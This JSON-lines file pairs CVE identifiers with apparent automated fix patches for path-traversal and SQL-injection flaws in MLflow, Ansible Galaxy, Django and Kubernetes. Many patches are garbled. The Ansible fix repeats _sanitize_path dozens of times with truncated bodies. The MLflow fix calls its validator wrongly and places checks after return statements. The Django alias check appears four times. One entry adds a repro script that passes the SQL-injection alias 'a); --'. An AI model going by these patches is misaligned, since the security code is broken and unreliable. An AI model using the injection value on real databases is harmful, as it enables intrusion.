artifact root.\")\n+\n+def _validate_path(path, artifact_dir):\n+    if \"..\" in path:\n+        raise MlflowException(f\"Path '{path}' contains '..'\")\n+    abs_path = os.path.abspath(os.path.join(artifact_dir, path))\n+    if not abs_path.startswith(os.path.abspath(artifact_dir)):\n+        raise MlflowException(\n+            f\"Path '{path}' resolves to a location outside of the artifact root.\"\n+        )\n \n-\n-@catch_mlflow_exception\n-def get_artifact_handler():\n+    path = _get_request_param_or_ignore(\"path\")\n+    if path:\n+        _validate_path(path)\n     from querystring_parser import parser\n \n     query_string = request.query_string.decode(\"utf-8\")\n@@ -881,6 +944,8 @@ def _search_runs():\n     response.set_data(message_to_json(response_message))\n     return response\n \n+    if path:\n+        _validate_path(path)\n \n @catch_mlflow_exception\n @_disable_if_artifacts_only\n"}
{"cve":"CVE-2020-10691:0708", "fix_patch": "diff --git a/lib/ansible/galaxy/collection.py b/lib/ansible/galaxy/collection.py\nindex fd50472f79..92b7b54c2f 100644\n--- a/lib/ansible/galaxy/collection.py\n+++ b/lib/ansible/galaxy/collection.py\n@@ -185,7 +185,9 @@ class CollectionRequirement:\n                     _extract_tar_file(collection_tar, file_name, b_collection_path, b_temp_path,\n                                       expected_hash=file_info['chksum_sha256'])\n                 else:\n-                    os.makedirs(os.path.join(b_collection_path, to_bytes(file_name, errors='surrogate_or_strict')))\n+                    b_file_name = to_bytes(file_name, errors='surrogate_or_strict')\n+                    b_file_path = _sanitize_path(b_file_name, b_collection_path)\n+                    os.makedirs(b_file_path)\n \n     def set_latest_version(self):\n         self.versions = set([self.latest_version])\n@@ -900,6 +902,262 @@ def _download_file(url, b_path, expected_hash, validate_certs, headers=None):\n     return b_file_path\n \n \n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    \"\"\"Make sure the path is not outside of the collection directory.\"\"\"\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError(\"Invalid path %s, refuses to continue.\" % to_text(b_path))\n+\n+    return b_path\n+\n+\n def _extract_tar_file(tar, filename, b_dest, b_temp_path, expected_hash=None):\n     n_filename = to_native(filename, errors='surrogate_or_strict')\n     try:\n@@ -925,7 +1183,7 @@ def _extract_tar_file(tar, filename, b_dest, b_temp_path, expected_hash=None):\n             raise AnsibleError(\"Checksum mismatch for '%s' inside collection at '%s'\"\n                                % (n_filename, to_native(tar.name)))\n \n-        b_dest_filepath = os.path.join(b_dest, to_bytes(filename, errors='surrogate_or_strict'))\n+        b_dest_filepath = _sanitize_path(to_bytes(filename, errors='surrogate_or_strict'), b_dest)\n         b_parent_dir = os.path.split(b_dest_filepath)[0]\n         if not os.path.exists(b_parent_dir):\n             # Seems like Galaxy does not validate if all file entries have a corresponding dir ftype entry. This check\n@@ -939,4 +1197,105 @@ def _extract_tar_file(tar, filename, b_dest, b_temp_path, expected_hash=None):\n         if stat.S_IMODE(member.mode) & stat.S_IXUSR:\n             new_mode |= 0o0111\n \n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(b_path))\n+\n+    return b_path\n+\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(b_path))\n+\n+    return b_path\n+\n+\n+\n+def _sanitize_path(path, collection_path):\n+    collection_path = os.path.realpath(to_bytes(collection_path, errors='surrogate_or_strict'))\n+    path = os.path.realpath(os.path.join(collection_path, to_bytes(path, errors='surrogate_or_strict')))\n+\n+    if os.path.commonprefix((collection_path, path)) != collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(path))\n+\n+    return path\n+\n+\n+def _sanitize_path(path, collection_path):\n+    collection_path = os.path.realpath(to_bytes(collection_path, errors='surrogate_or_strict'))\n+    path = os.path.realpath(os.path.join(collection_path, to_bytes(path, errors='surrogate_or_strict')))\n+\n+    if os.path.commonprefix((collection_path, path)) != collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(path))\n+\n+    return path\n+\n+\n+def _sanitize_path(path, collection_path):\n+    collection_path = os.path.realpath(to_bytes(collection_path, errors='surrogate_or_strict'))\n+    path = os.path.realpath(os.path.join(collection_path, to_bytes(path, errors='surrogate_or_strict')))\n+\n+    if os.path.commonprefix((collection_path, path)) != collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(path))\n+\n+    return path\n+\n+\n+\n+def _sanitize_path(b_path, b_collection_path):\n+    b_collection_path = os.path.realpath(b_collection_path)\n+    b_path = os.path.realpath(os.path.join(b_collection_path, b_path))\n+\n+    if os.path.commonprefix((b_collection_path, b_path)) != b_collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(b_path))\n+\n+    return b_path\n+\n+\n+def _sanitize_path(path, collection_path):\n+    collection_path = os.path.realpath(to_bytes(collection_path, errors='surrogate_or_strict'))\n+    path = os.path.realpath(os.path.join(collection_path, to_bytes(path, errors='surrogate_or_strict')))\n+\n+    if os.path.commonprefix((collection_path, path)) != collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(path))\n+\n+    return path\n+\n+\n+def _sanitize_path(path, collection_path):\n+    collection_path = os.path.realpath(to_bytes(collection_path, errors='surrogate_or_strict'))\n+    path = os.path.realpath(os.path.join(collection_path, to_bytes(path, errors='surrogate_or_strict')))\n+\n+    if os.path.commonprefix((collection_path, path)) != collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(path))\n+\n+    return path\n+\n+def _sanitize_path(path, collection_path):\n+    collection_path = os.path.realpath(to_bytes(collection_path, errors='surrogate_or_strict'))\n+    path = os.path.realpath(os.path.join(collection_path, to_bytes(path, errors='surrogate_or_strict')))\n+\n+    if os.path.commonprefix((collection_path, path)) != collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(path))\n+\n+    return path\n         os.chmod(b_dest_filepath, new_mode)\n+\n+def _sanitize_path(path, collection_path):\n+    collection_path = os.path.realpath(to_bytes(collection_path, errors='surrogate_or_strict'))\n+    path = os.path.realpath(os.path.join(collection_path, to_bytes(path, errors='surrogate_or_strict')))\n+\n+    if os.path.commonprefix((collection_path, path)) != collection_path:\n+        raise AnsibleError('Invalid path: %s' % to_text(path))\n+\n+    return path\n\\ No newline at end of file\n"}
{"cve":"CVE-2024-42005:0708", "fix_patch": "diff --git a/django/db/models/sql/query.py b/django/db/models/sql/query.py\nindex 277e8a18ca..4aae8b368a 100644\n--- a/django/db/models/sql/query.py\n+++ b/django/db/models/sql/query.py\n@@ -2466,6 +2466,23 @@ class Query(BaseExpression):\n                             \"promote it.\"\n                         )\n                     else:\n+                        # Prohibit passing JSONField lookups containing quotes to\n+                        # prevent SQL injection.\n+                        parts = f.split(LOOKUP_SEP)\n+                        if len(parts) > 1:\n+                            try:\n+                                field = self.model._meta.get_field(parts[0])\n+                                if (\n+                                    field.get_internal_type() == \"JSONField\"\n+                                    and '\"' in f\n+                                ):\n+                                    raise FieldError(\n+                                        \"JSONField lookup key may not contain quotes.\"\n+                                    )\n+                            except exceptions.FieldDoesNotExist:\n+                                # This field will be rejected later by\n+                                # names_to_path() or add_fields().\n+                                pass\n                         # Call `names_to_path` to ensure a FieldError including\n                         # annotations about to be masked as valid choices if\n                         # `f` is not resolvable.\n"}
{"cve":"CVE-2022-28346:0708", "fix_patch": "diff --git a/django/db/models/sql/query.py b/django/db/models/sql/query.py\nindex f5f85a4d34..0f461d4630 100644\n--- a/django/db/models/sql/query.py\n+++ b/django/db/models/sql/query.py\n@@ -1034,7 +1034,32 @@ class Query(BaseExpression):\n             alias = seen[int_model] = join_info.joins[-1]\n         return alias or seen[None]\n \n+    def _check_alias(self, alias):\n+        # Aliases are used in expressions which are passed to the database\n+        # unfiltered. They must not contain any special characters that\n+        # may be used to escape columns names, e.g. semicolon or NUL.\n+        if ';' in alias or '\\0' in alias:\n+            raise ValueError('Invalid alias: %r' % alias)\n+\n+    def _check_alias(self, alias):\n+        # Aliases are used in expressions which are passed to the database\n+        # unfiltered. They must not contain any special characters that\n+        # may be used to escape columns names, e.g. semicolon or NUL.\n+        if ';' in alias or '\\0' in alias:\n+            raise ValueError('Invalid alias: %r' % alias)\n+\n+    def _check_alias(self, alias):\n+        # Aliases are used in expressions which are passed to the database\n+        # unfiltered. They must not contain any special characters that\n+        # may be used to escape columns names, e.g. semicolon.\n+        if ';' in alias:\n+            raise ValueError('Invalid alias: %r' % alias)\n+\n+    def _check_alias(self, alias):\n+        if ';' in alias:\n+            raise ValueError('Invalid alias: %r' % alias)\n     def add_annotation(self, annotation, alias, is_summary=False, select=True):\n+        self._check_alias(alias)\n         \"\"\"Add a single annotation expression to the Query.\"\"\"\n         annotation = annotation.resolve_expression(self, allow_joins=True, reuse=None,\n                                                    summarize=is_summary)\ndiff --git a/repro.py b/repro.py\nnew file mode 100644\nindex 0000000000..9bf791ab0d\n--- /dev/null\n+++ b/repro.py\n@@ -0,0 +1,55 @@\n+import os\n+import sys\n+import django\n+from django.conf import settings\n+from django.db import connection\n+from django.db.models.aggregates import Count\n+\n+# Add the project directory to the python path\n+sys.path.insert(0, '/workspace/django')\n+\n+\n+\n+if not settings.configured:\n+    settings.configure(\n+        DATABASES={\n+            'default': {\n+                'ENGINE': 'django.db.backends.sqlite3',\n+                'NAME': ':memory:'\n+            }\n+        },\n+        INSTALLED_APPS=[\n+            'django.contrib.contenttypes',\n+            'django.contrib.auth',\n+            'repro_app'\n+        ]\n+    )\n+    django.setup()\n+\n+# Add the project directory to the python path\n+sys.path.insert(0, '/workspace/django')\n+\n+if __name__ == '__main__':\n+    settings.configure(\n+        DATABASES={\n+            'default': {\n+                'ENGINE': 'django.db.backends.sqlite3',\n+                'NAME': ':memory:'\n+            }\n+        },\n+        INSTALLED_APPS=[\n+            'django.contrib.contenttypes',\n+            'django.contrib.auth',\n+            'repro_app'\n+        ]\n+    )\n+    django.setup()\n+    from repro_app.models import MyModel\n+\n+    with connection.schema_editor() as editor:\n+        editor.create_model(MyModel)\n+    try:\n+        print(MyModel.objects.annotate(**{'a); --': Count('id')}).query)\n+    finally:\n+        with connection.schema_editor() as editor:\n+            editor.delete_model(MyModel)\n\\ No newline at end of file\ndiff --git a/repro_app/__init__.py b/repro_app/__init__.py\nnew file mode 100644\nindex 0000000000..e69de29bb2\ndiff --git a/repro_app/apps.py b/repro_app/apps.py\nnew file mode 100644\nindex 0000000000..8f109bb9c3\n--- /dev/null\n+++ b/repro_app/apps.py\n@@ -0,0 +1,4 @@\n+from django.apps import AppConfig\n+\n+class ReproAppConfig(AppConfig):\n+    name = 'repro_app'\n\\ No newline at end of file\ndiff --git a/repro_app/models.py b/repro_app/models.py\nnew file mode 100644\nindex 0000000000..5b93307cf6\n--- /dev/null\n+++ b/repro_app/models.py\n@@ -0,0 +1,4 @@\n+from django.db import models\n+\n+class MyModel(models.Model):\n+    pass\n\\ No newline at end of file\n"}
{"cve":"CVE-2021-31542:0708", "fix_patch": "diff --git a/django/core/files/storage.py b/django/core/files/storage.py\nindex 1562614e50..3ba9933802 100644\n--- a/django/core/files/storage.py\n+++ b/django/core/files/storage.py\n@@ -66,6 +66,10 @@ class Storage:\n         available for new content to be written to.\n         \"\"\"\n         dir_name, file_name = os.path.split(name)\n+        if not self.get_valid_name(file_name) == file_name:\n+            raise SuspiciousFileOperation(\n+                \"File name '%s' includes path-traversal characters\" % file_name\n+            )\n         file_root, file_ext = os.path.splitext(file_name)\n         # If the filename already exists, add an underscore and a random 7\n         # character alphanumeric string (before the file extension, if one\n"}
{"cve":"CVE-2024-10220:0708", "fix_patch": "diff --git a/pkg/volume/git_repo/git_repo.go b/pkg/volume/git_repo/git_repo.go\nindex 995018d9007..c909b736a2f 100644\n--- a/pkg/volume/git_repo/git_repo.go\n+++ b/pkg/volume/git_repo/git_repo.go\n@@ -17,285 +17,288 @@ limitations under the License.\n package git_repo\n \n import (\n-\t\"fmt\"\n-\t\"io/ioutil\"\n-\t\"path/filepath\"\n-\t\"strings\"\n-\n-\tv1 \"k8s.io/api/core/v1\"\n-\t\"k8s.io/apimachinery/pkg/types\"\n-\t\"k8s.io/kubernetes/pkg/volume\"\n-\tvolumeutil \"k8s.io/kubernetes/pkg/volume/util\"\n-\t\"k8s.io/utils/exec\"\n-\tutilstrings \"k8s.io/utils/strings\"\n+        \"fmt\"\n+        \"io/ioutil\"\n+        \"path/filepath\"\n+        \"strings\"\n+\n+        v1 \"k8s.io/api/core/v1\"\n+        \"k8s.io/apimachinery/pkg/types\"\n+        \"k8s.io/kubernetes/pkg/volume\"\n+        volumeutil \"k8s.io/kubernetes/pkg/volume/util\"\n+        \"k8s.io/utils/exec\"\n+        utilstrings \"k8s.io/utils/strings\"\n )\n \n // This is the primary entrypoint for volume plugins.\n func ProbeVolumePlugins() []volume.VolumePlugin {\n-\treturn []volume.VolumePlugin{&gitRepoPlugin{nil}}\n+        return []volume.VolumePlugin{&gitRepoPlugin{nil}}\n }\n \n type gitRepoPlugin struct {\n-\thost volume.VolumeHost\n+        host volume.VolumeHost\n }\n \n var _ volume.VolumePlugin = &gitRepoPlugin{}\n \n func wrappedVolumeSpec() volume.Spec {\n-\treturn volume.Spec{\n-\t\tVolume: &v1.Volume{VolumeSource: v1.VolumeSource{EmptyDir: &v1.EmptyDirVolumeSource{}}},\n-\t}\n+        return volume.Spec{\n+                Volume: &v1.Volume{VolumeSource: v1.VolumeSource{EmptyDir: &v1.EmptyDirVolumeSource{}}},\n+        }\n }\n \n const (\n-\tgitRepoPluginName = \"kubernetes.io/git-repo\"\n+        gitRepoPluginName = \"kubernetes.io/git-repo\"\n )\n \n func (plugin *gitRepoPlugin) Init(host volume.VolumeHost) error {\n-\tplugin.host = host\n-\treturn nil\n+        plugin.host = host\n+        return nil\n }\n \n func (plugin *gitRepoPlugin) GetPluginName() string {\n-\treturn gitRepoPluginName\n+        return gitRepoPluginName\n }\n \n func (plugin *gitRepoPlugin) GetVolumeName(spec *volume.Spec) (string, error) {\n-\tvolumeSource, _ := getVolumeSource(spec)\n-\tif volumeSource == nil {\n-\t\treturn \"\", fmt.Errorf(\"Spec does not reference a Git repo volume type\")\n-\t}\n-\n-\treturn fmt.Sprintf(\n-\t\t\"%v:%v:%v\",\n-\t\tvolumeSource.Repository,\n-\t\tvolumeSource.Revision,\n-\t\tvolumeSource.Directory), nil\n+        volumeSource, _ := getVolumeSource(spec)\n+        if volumeSource == nil {\n+                return \"\", fmt.Errorf(\"Spec does not reference a Git repo volume type\")\n+        }\n+\n+        return fmt.Sprintf(\n+                \"%v:%v:%v\",\n+                volumeSource.Repository,\n+                volumeSource.Revision,\n+                volumeSource.Directory), nil\n }\n \n func (plugin *gitRepoPlugin) CanSupport(spec *volume.Spec) bool {\n-\treturn spec.Volume != nil && spec.Volume.GitRepo != nil\n+        return spec.Volume != nil && spec.Volume.GitRepo != nil\n }\n \n func (plugin *gitRepoPlugin) RequiresRemount(spec *volume.Spec) bool {\n-\treturn false\n+        return false\n }\n \n func (plugin *gitRepoPlugin) SupportsMountOption() bool {\n-\treturn false\n+        return false\n }\n \n func (plugin *gitRepoPlugin) SupportsBulkVolumeVerification() bool {\n-\treturn false\n+        return false\n }\n \n func (plugin *gitRepoPlugin) SupportsSELinuxContextMount(spec *volume.Spec) (bool, error) {\n-\treturn false, nil\n+        return false, nil\n }\n \n func (plugin *gitRepoPlugin) NewMounter(spec *volume.Spec, pod *v1.Pod, opts volume.VolumeOptions) (volume.Mounter, error) {\n-\tif err := validateVolume(spec.Volume.GitRepo); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\treturn &gitRepoVolumeMounter{\n-\t\tgitRepoVolume: &gitRepoVolume{\n-\t\t\tvolName: spec.Name(),\n-\t\t\tpodUID:  pod.UID,\n-\t\t\tplugin:  plugin,\n-\t\t},\n-\t\tpod:      *pod,\n-\t\tsource:   spec.Volume.GitRepo.Repository,\n-\t\trevision: spec.Volume.GitRepo.Revision,\n-\t\ttarget:   spec.Volume.GitRepo.Directory,\n-\t\texec:     exec.New(),\n-\t\topts:     opts,\n-\t}, nil\n+        if err := validateVolume(spec.Volume.GitRepo); err != nil {\n+                return nil, err\n+        }\n+\n+        return &gitRepoVolumeMounter{\n+                gitRepoVolume: &gitRepoVolume{\n+                        volName: spec.Name(),\n+                        podUID:  pod.UID,\n+                        plugin:  plugin,\n+                },\n+                pod:      *pod,\n+                source:   spec.Volume.GitRepo.Repository,\n+                revision: spec.Volume.GitRepo.Revision,\n+                target:   spec.Volume.GitRepo.Directory,\n+                exec:     exec.New(),\n+                opts:     opts,\n+        }, nil\n }\n \n func (plugin *gitRepoPlugin) NewUnmounter(volName string, podUID types.UID) (volume.Unmounter, error) {\n-\treturn &gitRepoVolumeUnmounter{\n-\t\t&gitRepoVolume{\n-\t\t\tvolName: volName,\n-\t\t\tpodUID:  podUID,\n-\t\t\tplugin:  plugin,\n-\t\t},\n-\t}, nil\n+        return &gitRepoVolumeUnmounter{\n+                &gitRepoVolume{\n+                        volName: volName,\n+                        podUID:  podUID,\n+                        plugin:  plugin,\n+                },\n+        }, nil\n }\n \n func (plugin *gitRepoPlugin) ConstructVolumeSpec(volumeName, mountPath string) (volume.ReconstructedVolume, error) {\n-\tgitVolume := &v1.Volume{\n-\t\tName: volumeName,\n-\t\tVolumeSource: v1.VolumeSource{\n-\t\t\tGitRepo: &v1.GitRepoVolumeSource{},\n-\t\t},\n-\t}\n-\treturn volume.ReconstructedVolume{\n-\t\tSpec: volume.NewSpecFromVolume(gitVolume),\n-\t}, nil\n+        gitVolume := &v1.Volume{\n+                Name: volumeName,\n+                VolumeSource: v1.VolumeSource{\n+                        GitRepo: &v1.GitRepoVolumeSource{},\n+                },\n+        }\n+        return volume.ReconstructedVolume{\n+                Spec: volume.NewSpecFromVolume(gitVolume),\n+        }, nil\n }\n \n // gitRepo volumes are directories which are pre-filled from a git repository.\n // These do not persist beyond the lifetime of a pod.\n type gitRepoVolume struct {\n-\tvolName string\n-\tpodUID  types.UID\n-\tplugin  *gitRepoPlugin\n-\tvolume.MetricsNil\n+        volName string\n+        podUID  types.UID\n+        plugin  *gitRepoPlugin\n+        volume.MetricsNil\n }\n \n var _ volume.Volume = &gitRepoVolume{}\n \n func (gr *gitRepoVolume) GetPath() string {\n-\tname := gitRepoPluginName\n-\treturn gr.plugin.host.GetPodVolumeDir(gr.podUID, utilstrings.EscapeQualifiedName(name), gr.volName)\n+        name := gitRepoPluginName\n+        return gr.plugin.host.GetPodVolumeDir(gr.podUID, utilstrings.EscapeQualifiedName(name), gr.volName)\n }\n \n // gitRepoVolumeMounter builds git repo volumes.\n type gitRepoVolumeMounter struct {\n-\t*gitRepoVolume\n-\n-\tpod      v1.Pod\n-\tsource   string\n-\trevision string\n-\ttarget   string\n-\texec     exec.Interface\n-\topts     volume.VolumeOptions\n+        *gitRepoVolume\n+\n+        pod      v1.Pod\n+        source   string\n+        revision string\n+        target   string\n+        exec     exec.Interface\n+        opts     volume.VolumeOptions\n }\n \n var _ volume.Mounter = &gitRepoVolumeMounter{}\n \n func (b *gitRepoVolumeMounter) GetAttributes() volume.Attributes {\n-\treturn volume.Attributes{\n-\t\tReadOnly:       false,\n-\t\tManaged:        true,\n-\t\tSELinuxRelabel: true, // xattr change should be okay, TODO: double check\n-\t}\n+        return volume.Attributes{\n+                ReadOnly:       false,\n+                Managed:        true,\n+                SELinuxRelabel: true, // xattr change should be okay, TODO: double check\n+        }\n }\n \n // SetUp creates new directory and clones a git repo.\n func (b *gitRepoVolumeMounter) SetUp(mounterArgs volume.MounterArgs) error {\n-\treturn b.SetUpAt(b.GetPath(), mounterArgs)\n+        return b.SetUpAt(b.GetPath(), mounterArgs)\n }\n \n // SetUpAt creates new directory and clones a git repo.\n func (b *gitRepoVolumeMounter) SetUpAt(dir string, mounterArgs volume.MounterArgs) error {\n-\tif volumeutil.IsReady(b.getMetaDir()) {\n-\t\treturn nil\n-\t}\n-\n-\t// Wrap EmptyDir, let it do the setup.\n-\twrapped, err := b.plugin.host.NewWrapperMounter(b.volName, wrappedVolumeSpec(), &b.pod, 